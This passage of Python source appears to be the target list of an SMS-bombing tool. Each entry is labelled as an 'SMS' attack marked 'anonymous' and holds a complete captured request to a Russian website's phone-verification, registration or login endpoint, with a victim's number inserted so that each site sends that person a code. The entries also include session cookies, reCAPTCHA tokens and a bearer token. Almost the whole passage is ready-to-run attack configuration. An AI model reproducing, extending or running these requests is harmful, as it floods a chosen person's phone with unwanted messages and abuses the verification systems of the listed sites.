'GS1.1.1686429101.1.1.1686430573.0.0.0', '_ga_28W0RF9MZ6': 'GS1.1.1686429101.1.1.1686430573.0.0.0', 'tmr_detect': '0%7C1686430574757',},
            'headers': {'authority': 'www.akusherstvo.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.akusherstvo.ru', 'referer': 'https://www.akusherstvo.ru/user.php?action=reg', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'user_name=User&user_email={email()}&user_pass=HRg-TKR-4x8-JhJ&user_pass2=HRg-TKR-4x8-JhJ&user_phone={number}&g-recaptcha-response=03AL8dmw-ugvhzOV-vVeBYq50dFWiKaZoVCRTZlbGkqgzPK-NW1BQj4YOnq8o6PWM1WGxGjREvQdxetBUyOexPMnQHdvsWY2oRZdAgG2ceqnRn2BO2TZGXNr47kG01xkExGQ-nX_BmX5gUrT5_JuJSehcKrjNmw892jNH7tJw1b4vQlkS6MPgSCNUTb8hOpxfIl7C1llVscSnTYoo9DhxSI6pFujjfECZafrU6K0a2-BOosa2dXYsTB_oQX9wihX1CtguEqSIlnaaWALjBnqilDDG1cTcApTEAa7i0GoYS4JBYYX-gx_Oj-LfdDi6fZFLxzXTmvxWGKU9y646ElBGLatQMWT7-2dYsnFfwm0aB3fU00yvbvSj5-xcrmptAhhWkLa6Li8_BsgEwePW3N_--On89Wzxryxu7Z3dm5icQAGZH-Xbx5Riye_8qLQOI-asdxtgFw0g9toJdSPsBsmaxKCpk83H0rogKWrhEkH5pvPVh9cnmMZYmBOWMIVz4uUQYv2cj1fmuxKCBJztXJixsIF7gv7jDUg9ELFxUTvllu3mi_CmYwWzkrWFguiXO6W9_1NPBm_s1c7PK',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'oao-TTS.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://oao-tts.ru/',
            'cookies': {'PHPSESSID': 'Kg5qkXp5q0YZoa3ZSjZTzAisamSIvHnh', 'BX_USER_ID': 'f8c78066fc85eeb3e236467d43be6661',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://oao-tts.ru', 'Referer': 'https://oao-tts.ru/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0%3D&PAGEN_1=2', 'Sec-Fetch-Dest': 'iframe', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'bxajaxid': 'ece77fbcc90d48170c38ffb7f913f942', 'AJAX_CALL': 'Y', 'submit': 'echo:auth.register.phone', 'send_sms': '1', 'phone': f'+7({str(number)[1:4]}){str(number)[4:]}', 'name': 'User', 'fam': 'Name', 'password': '6i4-kn5-URh-SM2', 'confirm': '6i4-kn5-URh-SM2', 'agree': '1',},
            'params': {'alg_wc_ev_verify_email': 'eyJpZCI6MSwiY29kZSI6MH0=', 'PAGEN_1': '2',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'OFD.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lk.ofd.ru/api/Authorization/SendConfirmationCode',
            'cookies': {'_ym_uid': '1687180738325253150', '_ym_d': '1687180738', '_gcl_au': '1.1.1519848481.1687180739', '_ym_visorc': 'w', '_ym_isad': '1', 'tmr_lvid': 'e9ec2c0f7657e480e2c26e1664508e0c', 'tmr_lvidTS': '1687180739810', '_gid': 'GA1.2.1553436630.1687180740', 'PAC': '41f58694f536440ba73eb02600dbbb11', 'AccountId': '8a7d43e6-6af6-400c-ac19-b02600dbbb11', 'amplitude_id_603b179472aad88aa4567a6cedc64e96ofd.ru': 'eyJkZXZpY2VJZCI6IjdkOGZlOTJhLTYwYWYtNDViOS05ZWZlLTNmNmY2MDMyOGJmNFIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY4NzE4MDc4MTc0NSwibGFzdEV2ZW50VGltZSI6MTY4NzE4MDc4MTc0NSwiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9', '_gat_gtag_UA_82171814_8': '1', '_ga_ZTC58DJMM1': 'GS1.1.1687180782.1.0.1687180782.60.0.0', '_ga': 'GA1.1.465267250.1687180740', '_ga': 'GA1.3.465267250.1687180740', '_gid': 'GA1.3.1553436630.1687180740', '_gat_UA-82171814-8': '1',},
            'headers': {'authority': 'lk.ofd.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'ofd-user-id': '8a7d43e6-6af6-400c-ac19-b02600dbbb11', 'origin': 'https://lk.ofd.ru', 'referer': 'https://lk.ofd.ru/sign/up?Login=79249518462', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'Recipient': number, 'OperationType': 'Registration',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'iPakt.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://mw.ipakt.ru/api/playerv2/register',
            'cookies': {'_ym_uid': '1687245135124042685', '_ym_d': '1687245135', '_ym_isad': '1', 'PHPSESSID': 'o42ervtem0h568kppdtu9ru4so',},
            'headers': {'authority': 'mw.ipakt.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://mw.ipakt.ru', 'referer': 'https://mw.ipakt.ru/portal/browser.html', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'data': {'user_firstname': 'User', 'user_phone': number, 'time': '1687248309', 'operator': '1', 'dtoken': 'd41d8cd98f00b204e9800998ecf8427e', 'hash': '1f1720923f2f1b4f0e51e0f88502a789', 'device_name': '', 'os': 'browser', 'device_id': '', 'lang': 'ru',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': '101Internet.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://101internet.ru/api/v2/auth/moment-codes',
            'cookies': {'uuid': 'ed31c78d-16ee-4135-9f22-dbeded8d4cec', 'current_region': '74', '_ym_uid': '168717675270318852', '_ym_d': '1687176752', '_ym_visorc': 'w', '_ym_isad': '1', 'firstURL': '/chelyabinskaya-oblast/providers/zlat-telecom', 'isViewDetectRegion': 'false', 'metriksVisitor': 'true', '_ga': 'GA1.2.1993294252.1687176753', '_gid': 'GA1.2.534893622.1687176753', '_gat_UA-17096141-5': '1', 'connect.sid': 's%3AAbmgiZ5F1sPkSgmrtBM_cLSLMAcKHYii.4aFl88ZOUxLJy3pSUMu%2F%2Fihx0GJ37pUeYFSynKZdq%2Bg',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://101internet.ru', 'Referer': 'https://101internet.ru/chelyabinskaya-oblast/providers/zlat-telecom', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'action': 'login', 'target': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Piter-Online.net', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://piter-online.net/api/v2/auth/moment-codes',
            'cookies': {'uuid': 'cde90bd0-0b4f-45dc-9184-8a484eedeabf', 'current_region': '78', '_ym_uid': '1687253710829669460', '_ym_d': '1687253710', '_ym_isad': '1', 'firstURL': '/providers/integral-servis', '_ym_visorc': 'w', 'metriksVisitor': 'true', '_ga': 'GA1.2.591231473.1687253713', '_gid': 'GA1.2.343348194.1687253713', '_gat_UA-17096141-11': '1', 'connect.sid': 's%3AEJyU8UBnAlwAUVZ-5Qg2PLPVlnba9tjj.N6zs%2F9MJOJrAZzMgGEmMbNGxERYRpgT2E1Rk64ukLhc',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://piter-online.net', 'Referer': 'https://piter-online.net/providers/integral-servis', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'action': 'login', 'target': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'ShoppingLive.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://shoppinglive.ru/phone-verification/send-code',
            'cookies': {'rrpvid': '847948298564803', 'rcuid': '647e099fcd70f2a251952d63', '_ym_uid': '1685981599573036045', '_ym_d': '1685981599', '_gcl_au': '1.1.703558927.1685981599', 'tmr_lvid': '731bfc0b73d8bf649295a30ec181faa6', 'tmr_lvidTS': '1685981598653', 'advcake_session_id': '3c347a4b-1547-a768-a0d3-b0273b9c5f9a', 'advcake_utm_partner': 'cityads_48Bg06', 'advcake_utm_webmaster': '', 'advcake_click_id': '8fLZ1YDSSUZ9Mb7', 'anonymous-consents': '%5B%5D', 'abtc': '79825A4385228E3A1A1685981620496269742', 'abtc-text-button_2': 'text_open', 'abtc-story-test_5': 'story_exist', 'abtc-checkout-button_2': 'active_button', 'abtc-crm-test_3': 'owm_crm', 'abtc-fast-buy-listing_1': 'not_fast_buy_listing', 'abtc-new-checkout-mode_1': 'not_new_checkout', 'abtc-new-quickorder-mode_1': 'not_new_quickorder', 'exp_id': 'text_open/not_fast_buy_listing/story_exist/active_button/owm_crm/not_new_quickorder/not_new_checkout', 'cookie-notification': 'NOT_ACCEPTED', 'akaas_sn_www_shoppinglive_ru': '2147483647~rv=40~id=84fab8effea7c077ea6d551977651f28~rn=Traffic%20Shift%20RU%20clone%201', '_userGUID': '0:lij1xa0e:Mj81RM_9a4eFUHnRyog2iaZTybMOaQCa', 'flocktory-uuid': '322e0ccb-2d3c-474d-9d34-b221352b3737-0', 'sl-cart': '0789c654-bcb8-4083-9547-34daa3ca7e78', 'advcake_trackid': 'b8710316-5efa-6d67-1ce8-5062095b5829', 'advcake_track_url': 'https%3A%2F%2Fwww.shoppinglive.ru%2F%3Futm_source%3Dadvcake_aff%26utm_medium%3Dcpa%26utm_campaign%3Dcityads_48Bg06%26advcake_params%3D8fLZ1YDSSUZ9Mb7%26etext%3D2202.Skqn85WJfcaEFCiPtNjbejGOVOEsEGrwFk4Mpy0BdRPkrPeygmGIBMm8ee9FPGEueWNodHJwcHlldGJjcml3cg.2bac7f73bec4c55c709823baae9a311e38c26db3%26yclid%3D3097038298110026228', 'route-cookie': '6a5131eaa5bba79a8681589a9dfd9e3e|9993591121153d7c1e5684c31db5e349', 'JSESSIONID': 'C4253ED9BE64EA97A1D86988F1ACCC6B', 'dSesn': '12c801ce-a32d-62b0-2d28-3bfcbbae8738', '_dvs': '0:lj86qsxz:LDaI7OjxklYKympFcdVdf_WdXxluV9Gb', 'RT': '"z=1&dm=shoppinglive.ru&si=iyutqjzoxo&ss=lj86qsno&sl=0&tt=0"', '_ym_isad': '1', 'acc_awl': 'c1de654e-1186-46ac-a99e-ba87804338d3', '_ym_visorc': 'w', '_gid': 'GA1.2.804273112.1687501370', '_gat_UA-25432719-1': '1', '_ga': 'GA1.1.2044186014.1685981599', 'tmr_detect': '1%7C1687501369667', '_ubtcuid': 'clj86qucy0000419nvc0scjqq', '_sp_ses.02a9': '*', '_ga_WYM7YK8GZH': 'GS1.1.1687501369.3.0.1687501375.54.0.0', '_sp_id.02a9': '40282d46-90ee-4e80-8a55-e2659867cf8f.1685981620.3.1687501380.1686403536.2faf0bc7-1555-4bd3-b781-ff04a0a1d0b6',},
            'headers': {'authority': 'shoppinglive.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'csrftoken': '6a2e7f69-a05d-4979-b40e-d450b32ea81c', 'origin': 'https://shoppinglive.ru', 'referer': 'https://shoppinglive.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'phoneNumber': str(number)[1:],},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'VipAvenue.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://users.vipavenue.ru/api/auth/send-code',
            'cookies': {'session': 'JxghhyjnwSqtOILFi81mvDt447lLXueGH1SfSwUJ', '_ym_uid': '1687500493959662460', '_ym_d': '1687500493', 'tmr_lvid': '31a4c0b564dbbd558e1d6de1d9f98473', 'tmr_lvidTS': '1687500493365', '_gid': 'GA1.2.1968737746.1687500493', '_dc_gtm_UA-18568873-9': '1', '_ga_KXB8Z0CNHS': 'GS1.1.1687500493.1.0.1687500493.60.0.0', '_ym_isad': '1', '_ga': 'GA1.2.1274274499.1687500493', 'adspire_uid': 'AS.1418881253.1687500493', '_ym_visorc': 'w',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://vipavenue.ru', 'Referer': 'https://vipavenue.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': number, 'code_type': 'login', 'recaptcha_token': '03AL8dmw8ZEg4OF7R-A4pTsTAfb3QSg6uqGZ5s78gZzoOaCs5qevblKwV8ADduYxx9GhvlLZq2q4Xya9WQCTSaXYjbZ5XemLsOKU0EUgwGzGh9YlfEsi0bsstf8BHPZaLJM141C9s7EQcSKK_VnMMFvb_d9R3oeKNcZaERxGasoBQvT5rDfSF-e5mRunU0SD0ZdiR-AgxctjO6lh915vIGi01QXl_JzussNOOCPaQv4KyNq31BStif2hAE8dwRa-OaImYcVxg8Hzyk9H241luiAi4yanFaQ1OsarEvIzsUqN3-zVdDWskoUoKv-I3Tgz-CLp_I8tUnqGDhDGjpPUpmlylYbRHjAai_koL7RjyzwBWbVjcITZKVBWccsDsBAf0M2GD9QLuUjinNOAD_Xwt5JtqcNiiLeJj7FpGvW8SyCdMVw91pxCuZsqe7XXjjbBnhBSuP-QnL8kiIBdm8-R_P29CLS8lNcb5rbJi-zvHBtbTDIN9mE0gMO1jGzHSCO8DG1kUNgWezV_dIu77vTHPH7TJsp5M6jlr4pg', 'platform_type': 'desktop_site', 'site_gender_id': 36361, 'site_location_id': 37570,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Lazurit.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lazurit.com/local/ajax/register/',
            'cookies': {'_slfs': '1687354960061', 'city': '2', 'isCityChanged': 'true', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1687381140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', '_ym_uid': '1687354962962993014', '_ym_d': '1687354962', '_ym_visorc': 'b', 'flocktory-uuid': 'ebbc5c8e-24a5-42c8-bf45-eaf679f9ad05-8', '_gcl_au': '1.1.1115586901.1687354962', 'gtmSID': 'ee5a151b-2a98-42d7-9699-20c0a3e8965c', '_slid': '6492fe65bc6a5a16f30ef481', '_slsession': '6B40CA61-B92B-4DCC-9541-262E908BB1E3', '_slfreq': '64799e234d117a0d260056aa%3A64799e3836faf16507015a66%3A1687362163%3B64673aa968a393b6d90eadaf%3A64673aa968a393b6d90eadb3%3A1687362163', 'tmr_lvid': 'a9aac6c92108d242dde4298026a6c13b', 'tmr_lvidTS': '1687354963241', '_ym_isad': '1', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_gid': 'GA1.2.1945544852.1687354967', '_sp_ses.4e17': '*', '_ct_ids': 'c8jj3kus%3A36163%3A497311494', '_ct_session_id': '497311494', '_ct_site_id': '36163', '_ct': '1300000000323813867', '_ct_client_global_id': '26c794d8-c5b4-5916-bfa4-ceed28379ed8', 'supportOnlineTalkID': 'FlVzuvHLoFpuoxDlRxOHcXAot2LLAgd5', 'cted': 'modId%3Dc8jj3kus%3Bya_client_id%3D1687354962962993014%3Bclient_id%3D1271890846.1687354967', '_gpVisits': '{"isFirstVisitDomain":true,"idContainer":"100024EA"}', 'uxs_uid': '8510e000-1039-11ee-ab73-eb843cff32be', '_slid_server': '6492fe65bc6a5a16f30ef481', '_acfId': 'e2f845fe-cda8-4f7b-981a-23178ba3eb79', '_acfVisit': '2', 'BITRIX_SM_SOUND_LOGIN_PLAYED': 'Y', 'PHPSESSID': 'jmr9b7o7iv1plchrjpoodp9fft', 'BITRIX_SM_SALE_UID': '0', '_sp_id.4e17': 'a2697879-fdcc-4e2b-b182-b068d31dc16f.1687354968.1.1687355064..cd249714-ed95-420c-99a2-d7b394a112ac..9fe04696-acfd-4357-8874-1909e9c435f7.1687354967721.7', 'mindboxDeviceUUID': '63813d5c-7091-4e56-8b18-ab4ea61f42ed', 'directCrm-session': '%7B%22deviceGuid%22%3A%2263813d5c-7091-4e56-8b18-ab4ea61f42ed%22%7D', '_ga_R753LS4EP5': 'GS1.1.1687354967.1.1.1687355065.38.0.0', 'tmr_detect': '1%7C1687355066227', 'call_s': '%3C!%3E%7B%22c8jj3kus%22%3A%5B1687356887%2C497311494%2C%7B%22158926%22%3A%22861600%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E', '_ga_0NXH30EL4J': 'GS1.1.1687354968.1.1.1687355066.0.0.0', '_ga': 'GA1.1.1271890846.1687354967', '_gp100024EA': '{"hits":6,"vc":1,"ac":1,"a6":1}',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryFmfqvVaD2cPgySgL', 'Origin': 'https://lazurit.com', 'Referer': 'https://lazurit.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryFmfqvVaD2cPgySgL\r\nContent-Disposition: form-data; name="name"\r\n\r\nЮзер\r\n------WebKitFormBoundaryFmfqvVaD2cPgySgL\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email()}\r\n------WebKitFormBoundaryFmfqvVaD2cPgySgL\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]} {str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundaryFmfqvVaD2cPgySgL\r\nContent-Disposition: form-data; name="password"\r\n\r\nsedctrfyguhijk\r\n------WebKitFormBoundaryFmfqvVaD2cPgySgL\r\nContent-Disposition: form-data; name="url"\r\n\r\n/personal/\r\n------WebKitFormBoundaryFmfqvVaD2cPgySgL--\r\n'.encode(),
            # Регистрация без смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Lazurit.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lazurit.com/local/ajax/auth/',
            'cookies': {'_slfs': '1687354960061', 'city': '2', 'isCityChanged': 'true', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1687381140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', '_ym_uid': '1687354962962993014', '_ym_d': '1687354962', '_ym_visorc': 'b', 'flocktory-uuid': 'ebbc5c8e-24a5-42c8-bf45-eaf679f9ad05-8', '_gcl_au': '1.1.1115586901.1687354962', 'gtmSID': 'ee5a151b-2a98-42d7-9699-20c0a3e8965c', '_slid': '6492fe65bc6a5a16f30ef481', '_slsession': '6B40CA61-B92B-4DCC-9541-262E908BB1E3', '_slfreq': '64799e234d117a0d260056aa%3A64799e3836faf16507015a66%3A1687362163%3B64673aa968a393b6d90eadaf%3A64673aa968a393b6d90eadb3%3A1687362163', 'tmr_lvid': 'a9aac6c92108d242dde4298026a6c13b', 'tmr_lvidTS': '1687354963241', '_ym_isad': '1', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_gid': 'GA1.2.1945544852.1687354967', '_sp_ses.4e17': '*', '_ct_ids': 'c8jj3kus%3A36163%3A497311494', '_ct_session_id': '497311494', '_ct_site_id': '36163', '_ct': '1300000000323813867', '_ct_client_global_id': '26c794d8-c5b4-5916-bfa4-ceed28379ed8', 'supportOnlineTalkID': 'FlVzuvHLoFpuoxDlRxOHcXAot2LLAgd5', 'cted': 'modId%3Dc8jj3kus%3Bya_client_id%3D1687354962962993014%3Bclient_id%3D1271890846.1687354967', '_gpVisits': '{"isFirstVisitDomain":true,"idContainer":"100024EA"}', 'uxs_uid': '8510e000-1039-11ee-ab73-eb843cff32be', '_slid_server': '6492fe65bc6a5a16f30ef481', '_acfId': 'e2f845fe-cda8-4f7b-981a-23178ba3eb79', '_acfVisit': '2', '_gat': '1', 'BITRIX_SM_SOUND_LOGIN_PLAYED': 'Y', '_gat_UA-8509936-1': '1', '_gat_gtag_UA_180274175_1': '1', 'PHPSESSID': 'jmr9b7o7iv1plchrjpoodp9fft', 'BITRIX_SM_SALE_UID': '0', '_sp_id.4e17': 'a2697879-fdcc-4e2b-b182-b068d31dc16f.1687354968.1.1687355064..cd249714-ed95-420c-99a2-d7b394a112ac..9fe04696-acfd-4357-8874-1909e9c435f7.1687354967721.7', 'mindboxDeviceUUID': '63813d5c-7091-4e56-8b18-ab4ea61f42ed', 'directCrm-session': '%7B%22deviceGuid%22%3A%2263813d5c-7091-4e56-8b18-ab4ea61f42ed%22%7D', '_ga_R753LS4EP5': 'GS1.1.1687354967.1.1.1687355065.38.0.0', 'tmr_detect': '1%7C1687355066227', 'call_s': '%3C!%3E%7B%22c8jj3kus%22%3A%5B1687356887%2C497311494%2C%7B%22158926%22%3A%22861600%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E', '_ga_0NXH30EL4J': 'GS1.1.1687354968.1.1.1687355066.0.0.0', '_ga': 'GA1.1.1271890846.1687354967', '_gp100024EA': '{"hits":6,"vc":1,"ac":1,"a6":1}',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary5XU7b1M7vfIRNORy', 'Origin': 'https://lazurit.com', 'Referer': 'https://lazurit.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundary5XU7b1M7vfIRNORy\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]} {str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundary5XU7b1M7vfIRNORy--\r\n',
            # Вход по смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'LoveRepublic.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.loverepublic.ru/web/v1/user/auth',
            'headers': {'authority': 'api.loverepublic.ru', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'authorization': 'Bearer d572c47907496e13c0602662a94292c6e9eb5a8204e5e47aa0af1888f48f74f6', 'content-type': 'application/json', 'origin': 'https://loverepublic.ru', 'referer': 'https://loverepublic.ru/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'name': '', 'lastName': '', 'email': '', 'phone': f'+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'action': None,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PizzaSushiWok.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://pizzasushiwok.ru/index.php',
            'cookies': {'__ddg1_': 'Mm5C6QwRBKOuCxYM4FoE', 'SameSite': 'true', 'PHPSESSID': '5-f-5fc5d075d25187eab7b1285ddb87530c', 'order_fingerprint': '1d1b6cc09d103489cf4ced63aa2041ba', 'SERVERID': 's5', '_aid': '22a7c6b2bc30b311de72b12098f6d624', '_ga_D6YKWBHWJW': 'GS1.1.1687352091.1.0.1687352091.0.0.0', '_ga': 'GA1.2.2137258484.1687352092', '_gid': 'GA1.2.1428227045.1687352092', '_dc_gtm_UA-10396069-20': '1', 'adtech_uid': '5832de77-7a58-44b1-a1ab-f95bf762e0f5%3Apizzasushiwok.ru', 'top100_id': 't1.4481621.31106579.1687352092352', 'last_visit': '1687334092358%3A%3A1687352092358', '_ym_uid': '1687352092502365924', '_ym_d': '1687352092', '_ym_isad': '1', '_ym_visorc': 'w', 't3_sid_4481621': 's1.1129897103.1687352092354.1687352107385.1.4',},
            'headers': {'authority': 'pizzasushiwok.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://pizzasushiwok.ru', 'referer': 'https://pizzasushiwok.ru/?admitad_uid=22a7c6b2bc30b311de72b12098f6d624&utm_source=admitad&partner=admitad', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'mod_name': 'phone_login', 'task': 'enter', 'phone': f'8-({str(number)[1:4]})-{str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'confidancial': '1', 'subscribe': '1',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Letu.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.letu.ru/s/api/user/account/v1/confirmations/phone',
